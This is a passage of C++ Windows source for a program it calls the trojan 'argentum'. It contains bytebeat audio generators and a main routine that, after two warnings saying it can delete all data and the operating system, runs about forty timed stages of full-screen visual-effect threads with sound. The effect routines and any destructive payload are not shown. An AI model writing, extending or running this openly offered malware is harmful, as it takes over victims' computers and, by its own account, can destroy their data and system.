	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (4 | t >> 13 & 3) >> (~t >> 11 & 1) & 128 | t * (t >> 11 & t >> 13) * (~t >> 9 & 3) & 127) ^ (t & 4096 ? (t * (t ^ t % 255) | t >> 4) >> 1 : t >> 3 | (t & 8192 ? t << 2 : t));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound23() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(5 * (t + (t ^ t >> 9) ^ 9) | 19 * (5 * t >> 43 | 15 * t >> 4) & (7 * t >> 172) / 2 * t * ((t >> 9 | t >> 13) & 15) & 129 | t * ((t >> 9 | 3 < t) & 25 & t >> 10));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound24() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * 3 | t >> 2 | t >> 6) * 30 & (t * 7 << -1 | t >> -2 | t >> 12) * 4;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound25() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(4 * t & t >> 4 | 6 * t & t >> 8 | 3 * t & t >> 5);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound26() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t | t >> 8) - (t ^ t >> 5) | (t & t << 4);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound27() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (6 + (((t >> 24 & 14 ? t >> (t >> 18 & 1 ? 13 : 12) & 3 : 1) ^ t >> (t >> 118 & 4 ? 514 : 13) & (0 - t >> (t >> 18 & 1 ? 15 : 14) & 3 ? 1 : 2)) + 3 & 3)) / 8 % 128 + (t * (6 + (t >> 16 & 3)) / 16 | t >> 7 ^ t >> 9) % 128);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound28() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		if ((t & 16383) != 0) buffer[t] = static_cast<char>(t >> 6 ^ t & t >> 8 ^ t >> 12 | (t << (t >> 6) % 4 ^ -t & -t >> 13) % 128 ^ -t >> 1 | 40000 / (t & 16383));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound29() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t & t >> 11) * (t >> 6 | t >> 8);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound30() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0, x, y; t < sizeof(buffer); ++t)
		if ((t & 4095) != 0) buffer[t] = static_cast<char>(128 / (y = t & 4095) * 250 + (x = t * (15 & 39014 >> (t >> 12 & 12)) / 6 & 127) * y / 10000 + ((t >> 6 ^ t >> 8 | t >> 12 | x) & 63));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound31() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t & t >> 8 & t >> 2);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound32() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(104 * (t | t | t >> 24) - 90 * (t | t >> 8));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound33() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 6 & t >> 7) + (t & t >> 9) | ~t >> 6);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound34() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		if ((t & 8191) != 0) buffer[t] = static_cast<char>(t & (t >> (t >> 12 & 15)) * t % 256 / 3 + (300000 / (t & 8191) & 127));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound35() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((5 * t & t >> 5 | 128 * t >> 4) >> t) & t >> 5 | t >> 4;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound36() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t << (t >> 13) * t + 127 | t >> 4);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound37() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(10 * (t >> 8 | t | t >> (t >> 16)) + (1 & t >> 11));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound38() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t & t % 239) ^ t) - t;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound39() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 8) & 56 & t >> 8 ^ (t & t >> 13 | t >> 6));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound40() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 34000, 34000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[34000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * t * rand());

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
	if (MessageBoxW(NULL, L"Warning! You have ran a trojan known as argentum that has full capacity to delete all of your data and your operating system. By continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it's highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis. Are you sure you want to run this?", L"argentum", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
		ExitProcess(0);
	}
	else {
		if (MessageBoxW(NULL, L"Final warning! This trojan has a lot of destructive potential. You will lose all of your data if you continue and the creator will not be responsible for any of the damage caused. This is not meant to be malicious, but simply for entertainment and educational purposes. Are you sure you want to continue? This is your final chance to stop this program from execution.", L"argentum", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
			ExitProcess(0);
		}
		else {
			Sleep(5000);
			HANDLE thread1 = CreateThread(0, 0, gdi1, 0, 0, 0);
			sound1();
			Sleep(30000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread2 = CreateThread(0, 0, shader1, 0, 0, 0);
			sound2();
			Sleep(30000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread3 = CreateThread(0, 0, shader2, 0, 0, 0);
			sound3();
			Sleep(30000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread4 = CreateThread(0, 0, shader3, 0, 0, 0);
			HANDLE thread4dot1 = CreateThread(0, 0, cur1, 0, 0, 0);
			sound4();
			Sleep(30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread5 = CreateThread(0, 0, shader4, 0, 0, 0);
			sound5();
			Sleep(30000);
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread6 = CreateThread(0, 0, shader5, 0, 0, 0);
			HANDLE thread6dot1 = CreateThread(0, 0, hexagon, 0, 0, 0);
			sound6();
			Sleep(30000);
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread7 = CreateThread(0, 0, shader6, 0, 0, 0);
			sound7();
			Sleep(30000);
			TerminateThread(thread7, 0);
			CloseHandle(thread7);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread8 = CreateThread(0, 0, shader7, 0, 0, 0);
			sound8();
			Sleep(30000);
			TerminateThread(thread8, 0);
			CloseHandle(thread8);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread9 = CreateThread(0, 0, patmash, 0, 0, 0);
			HANDLE thread9dot1 = CreateThread(0, 0, shapes, 0, 0, 0);
			sound9();
			Sleep(30000);
			TerminateThread(thread9, 0);
			CloseHandle(thread9);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread10 = CreateThread(0, 0, shader8, 0, 0, 0);
			HANDLE thread10dot1 = CreateThread(0, 0, gdi10, 0, 0, 0);
			sound10();
			Sleep(30000);
			TerminateThread(thread10, 0);
			CloseHandle(thread10);
			TerminateThread(thread10dot1, 0);
			CloseHandle(thread10dot1);
			TerminateThread(thread9dot1, 0);
			CloseHandle(thread9dot1);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread11 = CreateThread(0, 0, shader9, 0, 0, 0);
			sound11();
			Sleep(30000);
			TerminateThread(thread11, 0);
			CloseHandle(thread11);
			TerminateThread(thread6dot1, 0);
			CloseHandle(thread6dot1);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread12 = CreateThread(0, 0, shader10, 0, 0, 0);
			HANDLE thread12dot1 = CreateThread(0, 0, melt, 0, 0, 0);
			HANDLE thread12dot2 = CreateThread(0, 0, octagon, 0, 0, 0);
			sound12();
			Sleep(30000);
			TerminateThread(thread12, 0);
			CloseHandle(thread12);
			TerminateThread(thread12dot1, 0);
			CloseHandle(thread12dot1);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread13 = CreateThread(0, 0, shader11, 0, 0, 0);
			sound13();
			Sleep(30000);
			TerminateThread(thread13, 0);
			CloseHandle(thread13);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread14 = CreateThread(0, 0, gdi14, 0, 0, 0);
			HANDLE thread14dot1 = CreateThread(0, 0, textout, 0, 0, 0);
			sound14();
			Sleep(30000);
			TerminateThread(thread14, 0);
			CloseHandle(thread14);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread15 = CreateThread(0, 0, shader12, 0, 0, 0);
			sound15();
			Sleep(30000);
			TerminateThread(thread15, 0);
			CloseHandle(thread15);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread16 = CreateThread(0, 0, shader13, 0, 0, 0);
			sound16();
			Sleep(30000);
			TerminateThread(thread16, 0);
			CloseHandle(thread16);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread17 = CreateThread(0, 0, shader14, 0, 0, 0);
			sound17();
			Sleep(30000);
			TerminateThread(thread17, 0);
			CloseHandle(thread17);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread18 = CreateThread(0, 0, shader15, 0, 0, 0);
			HANDLE thread18dot1 = CreateThread(0, 0, cube, 0, 0, 0);
			sound18();
			Sleep(30000);
			TerminateThread(thread18, 0);
			CloseHandle(thread18);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread19 = CreateThread(0, 0, shader16, 0, 0, 0);
			sound19();
			Sleep(30000);
			TerminateThread(thread19, 0);
			CloseHandle(thread19);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread20 = CreateThread(0, 0, shader17, 0, 0, 0);
			sound20();
			Sleep(30000);
			TerminateThread(thread20, 0);
			CloseHandle(thread20);
			TerminateThread(thread12dot2, 0);
			CloseHandle(thread12dot2);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread21 = CreateThread(0, 0, shake, 0, 0, 0);
			HANDLE thread21dot1 = CreateThread(0, 0, ballz, 0, 0, 0);
			sound21();
			Sleep(30000);
			TerminateThread(thread21, 0);
			CloseHandle(thread21);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread22 = CreateThread(0, 0, shader18, 0, 0, 0);
			HANDLE thread22dot1 = CreateThread(0, 0, icons, 0, 0, 0);
			sound22();
			Sleep(30000);
			TerminateThread(thread22, 0);
			CloseHandle(thread22);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread23 = CreateThread(0, 0, shader19, 0, 0, 0);
			sound23();
			Sleep(30000);
			TerminateThread(thread23, 0);
			CloseHandle(thread23);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread24 = CreateThread(0, 0, shader20, 0, 0, 0);
			HANDLE thread24dot1 = CreateThread(0, 0, piez, 0, 0, 0);
			sound24();
			Sleep(30000);
			TerminateThread(thread24, 0);
			CloseHandle(thread24);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread25 = CreateThread(0, 0, shader21, 0, 0, 0);
			HANDLE thread25dot1 = CreateThread(0, 0, plgblt, 0, 0, 0);
			sound25();
			Sleep(30000);
			TerminateThread(thread25, 0);
			CloseHandle(thread25);
			TerminateThread(thread25dot1, 0);
			CloseHandle(thread25dot1);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread26 = CreateThread(0, 0, shader22, 0, 0, 0);
			sound26();
			Sleep(30000);
			TerminateThread(thread26, 0);
			CloseHandle(thread26);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread27 = CreateThread(0, 0, shader23, 0, 0, 0);
			sound27();
			Sleep(30000);
			TerminateThread(thread27, 0);
			CloseHandle(thread27);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread28 = CreateThread(0, 0, shader24, 0, 0, 0);
			sound28();
			Sleep(30000);
			TerminateThread(thread28, 0);
			CloseHandle(thread28);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread29 = CreateThread(0, 0, scroll, 0, 0, 0);
			HANDLE thread29dot1 = CreateThread(0, 0, shell32, 0, 0, 0);
			sound29();
			Sleep(30000);
			TerminateThread(thread29, 0);
			CloseHandle(thread29);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread30 = CreateThread(0, 0, shader25, 0, 0, 0);
			sound30();
			Sleep(30000);
			TerminateThread(thread30, 0);
			CloseHandle(thread30);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread31 = CreateThread(0, 0, plgblt1, 0, 0, 0);
			HANDLE thread31dot1 = CreateThread(0, 0, triangles, 0, 0, 0);
			sound31();
			Sleep(30000);
			TerminateThread(thread31, 0);
			CloseHandle(thread31);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread32 = CreateThread(0, 0, stretch, 0, 0, 0);
			sound32();
			Sleep(30000);
			TerminateThread(thread32, 0);
			CloseHandle(thread32);
			TerminateThread(thread31dot1, 0);
			CloseHandle(thread31dot1);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread33 = CreateThread(0, 0, shader26, 0, 0, 0);
			sound33();
			Sleep(30000);
			TerminateThread(thread33, 0);
			CloseHandle(thread33);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread34 = CreateThread(0, 0, shader27, 0, 0, 0);
			sound34();
			Sleep(30000);
			TerminateThread(thread34, 0);
			CloseHandle(thread34);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread35 = CreateThread(0, 0, shader28, 0, 0, 0);
			sound35();
			Sleep(30000);
			TerminateThread(thread35, 0);
			CloseHandle(thread35);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread36 = CreateThread(0, 0, shader29, 0, 0, 0);
			sound36();
			Sleep(30000);
			TerminateThread(thread36, 0);
			CloseHandle(thread36);
			TerminateThread(thread21dot1, 0);
			CloseHandle(thread21dot1);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread37 = CreateThread(0, 0, tan, 0, 0, 0);
			HANDLE thread37dot1 = CreateThread(0, 0, trianglez, 0, 0, 0);
			sound37();
			Sleep(30000);
			TerminateThread(thread37, 0);
			CloseHandle(thread37);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread38 = CreateThread(0, 0, shader30, 0, 0, 0);
			sound38();
			Sleep(30000);
			TerminateThread(thread38, 0);
			CloseHandle(thread38);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread39 = CreateThread(0, 0, shader31, 0, 0, 0);
			sound39();
			Sleep(30000);
			TerminateThread(thread39, 0);
			CloseHandle(thread39);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread40 = CreateThread(0, 0, woah, 0, 0, 0);
			HANDLE thread40dot1 = CreateThread(0, 0, woah1, 0, 0, 0);
			HANDLE thread40dot2 = CreateThread(0, 0, shader32, 0, 0, 0);
			HANDLE thread40dot3 = CreateThread(0, 0, shader33, 0, 0, 0);
			sound40();
			Sleep(30000);
		}
	}
}